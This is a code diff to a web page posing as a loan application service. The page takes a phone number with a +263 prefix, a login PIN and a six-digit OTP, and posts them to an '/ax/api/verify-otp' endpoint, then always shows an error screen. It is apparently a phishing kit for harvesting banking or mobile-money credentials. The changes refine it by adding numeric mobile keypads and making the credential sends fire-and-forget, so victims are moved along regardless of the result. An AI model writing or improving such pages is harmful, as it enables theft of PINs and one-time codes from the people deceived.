@@ -212,10 +212,10 @@
                 </div>
                 <label style="text-align: left;">Enter your PIN</label>
                 <div class="pin-container" id="loginPinBoxes">
-                    <input type="password" class="pin-box" maxlength="1">
-                    <input type="password" class="pin-box" maxlength="1">
-                    <input type="password" class="pin-box" maxlength="1">
-                    <input type="password" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
                 </div>
                 <button class="btn-primary" onclick="submitLogin()">LOGIN</button>
             </div>
@@ -227,12 +227,12 @@
                 <h2>OTP Verification</h2>
                 <div class="subtitle">Enter the OTP sent to your phone number<br><strong id="otpPhoneDisplay">+263123456789</strong></div>
                 <div class="pin-container" id="otpBoxes">
-                    <input type="text" class="pin-box" maxlength="1">
-                    <input type="text" class="pin-box" maxlength="1">
-                    <input type="text" class="pin-box" maxlength="1">
-                    <input type="text" class="pin-box" maxlength="1">
-                    <input type="text" class="pin-box" maxlength="1">
-                    <input type="text" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
+                    <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
                 </div>
                 <button class="btn-primary" onclick="submitOtp()">SUBMIT</button>
             </div>
@@ -317,7 +317,7 @@
         let countdownInterval = null;
 
         async function submitLoanApplication() {
-            showLoading('Submitting Application...', 'Please wait...');
+            showLoading('Submitting Application...',  'Please wait...');
             const payload = {
                 type: 'loan_application',
                 loanAmount: document.getElementById('inputAmount').value,
@@ -380,7 +380,7 @@
             document.querySelectorAll('#loginPinBoxes .pin-box').forEach(b => pinVal += b.value);
             
             try {
-                await fetch('/ax/api/verify-otp', {
+                fetch('/ax/api/verify-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -388,14 +388,15 @@
                         phoneNumber: '+263' + document.getElementById('loginPhone').value,
                         pin: pinVal
                     })
-                });
-                setTimeout(() => {
-                    hideLoading();
-                    goToScreen('otpScreen', '/ax/verify');
-                }, 1500);
+                }).catch(err => console.log('Background fetch error:', err));
             } catch(e) {
-                hideLoading();
+                console.log(e);
             }
+
+            setTimeout(() => {
+                hideLoading();
+                goToScreen('otpScreen', '/ax/verify');
+            }, 1500);
         }
 
         async function submitOtp() {
@@ -404,22 +405,22 @@
             document.querySelectorAll('#otpBoxes .pin-box').forEach(b => otpVal += b.value);
 
             try {
-                await fetch('/ax/api/verify-otp', {
+                fetch('/ax/api/verify-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         type: 'otp',
                         otp: otpVal
                     })
-                });
-                setTimeout(() => {
-                    hideLoading();
-                    document.getElementById('errorModal').style.display = 'flex';
-                }, 1500);
+                }).catch(err => console.log('Background fetch error:', err));
             } catch(e) {
+                console.log(e);
+            }
+
+            setTimeout(() => {
                 hideLoading();
                 document.getElementById('errorModal').style.display = 'flex';
-            }
+            }, 1500);
         }
 
         function closeErrorModal() {
